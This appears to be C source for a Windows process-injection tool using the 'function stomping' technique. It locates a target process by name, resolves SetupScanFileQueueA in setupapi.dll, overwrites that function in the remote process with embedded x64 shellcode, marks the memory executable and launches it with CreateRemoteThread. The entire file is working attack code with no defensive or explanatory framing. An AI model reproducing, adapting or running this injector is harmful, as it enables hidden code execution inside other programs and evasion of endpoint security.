#include <windows.h>
#include <stdio.h>
#include <Psapi.h>

#define		SACRIFICIAL_DLL          "setupapi.dll"
#define		SACRIFICIAL_FUNC         "SetupScanFileQueueA"


BYTE Payload[] = "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
"\x48\x83\xec\x20\x41\xff\xd6,\x00";


BOOL WritePayload(IN PVOID pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	DWORD	dwOldProtection = NULL;


	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [RW] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memcpy(pAddress, pPayload, sPayloadSize);

	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [RWX] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}



BOOL WritePayload(HANDLE hProcess, PVOID pAddress, PBYTE pPayload, SIZE_T sPayloadSize) {

	DWORD	dwOldProtection = NULL;
	SIZE_T	sNumberOfBytesWritten = NULL;

	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx [RW] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten) || sPayloadSize != sNumberOfBytesWritten) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[!] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
		return FALSE;
	}

	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx [RWX] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess) {

	DWORD		adwProcesses[1024 * 2],
		dwReturnLen1 = NULL,
		dwReturnLen2 = NULL,
		dwNmbrOfPids = NULL;

	HANDLE		hProcess = NULL;
	HMODULE		hModule = NULL;

	WCHAR		szProc[MAX_PATH];

	if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen1)) {
		printf("[!] EnumProcesses Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	dwNmbrOfPids = dwReturnLen1 / sizeof(DWORD);

	printf("[i] Number Of Processes Detected : %d \n", dwNmbrOfPids);

	for (int i = 0; i < dwNmbrOfPids; i++) {

		if (adwProcesses[i] != NULL) {

			if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, adwProcesses[i])) != NULL) {

				if (!EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnLen2)) {
					printf("[!] EnumProcessModules Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
				}
				else {
					if (!GetModuleBaseName(hProcess, hModule, szProc, sizeof(szProc) / sizeof(WCHAR))) {
						printf("[!] GetModuleBaseName Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
					}
					else {
						if (wcscmp(szProcName, szProc) == 0) {
							wprintf(L"[+] FOUND \"%s\" - Of Pid : %d \n", szProc, adwProcesses[i]);
							*pdwPid = adwProcesses[i];
							*phProcess = hProcess;
							break;
						}
					}
				}

				CloseHandle(hProcess);
			}
		}
	}

	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {

	HANDLE		hProcess = NULL,
		hThread = NULL;
	PVOID		pAddress = NULL;
	DWORD		dwProcessId = NULL;

	HMODULE		hModule = NULL;

	if (argc < 2) {
		wprintf(L"[!] Usage : \"%s\" <Process Name> \n", argv[0]);
		return -1;
	}

	wprintf(L"[i] Searching For Process Id Of \"%s\" ... ", argv[1]);
	if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
		printf("[!] Process is Not Found \n");
		return -1;
	}
	printf("[+] DONE \n");
	printf("[i] Found Target Process Pid: %d \n", dwProcessId);



	printf("[i] Loading \"%s\"... ", SACRIFICIAL_DLL);
	hModule = LoadLibraryA(SACRIFICIAL_DLL);
	if (hModule == NULL) {
		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
		return -1;
	}
	printf("[+] DONE \n");


	pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
	if (pAddress == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return -1;
	}
	printf("[+] Address Of \"%s\" : 0x%p \n", SACRIFICIAL_FUNC, pAddress);


	printf("[#] Press <Enter> To Write Payload ... ");
	getchar();
	printf("[i] Writing ... ");
	if (!WritePayload(hProcess, pAddress, Payload, sizeof(Payload))) {
		return -1;
	}
	printf("[+] DONE \n");



	printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();

	hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
	if (hThread != NULL)
		WaitForSingleObject(hThread, INFINITE);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}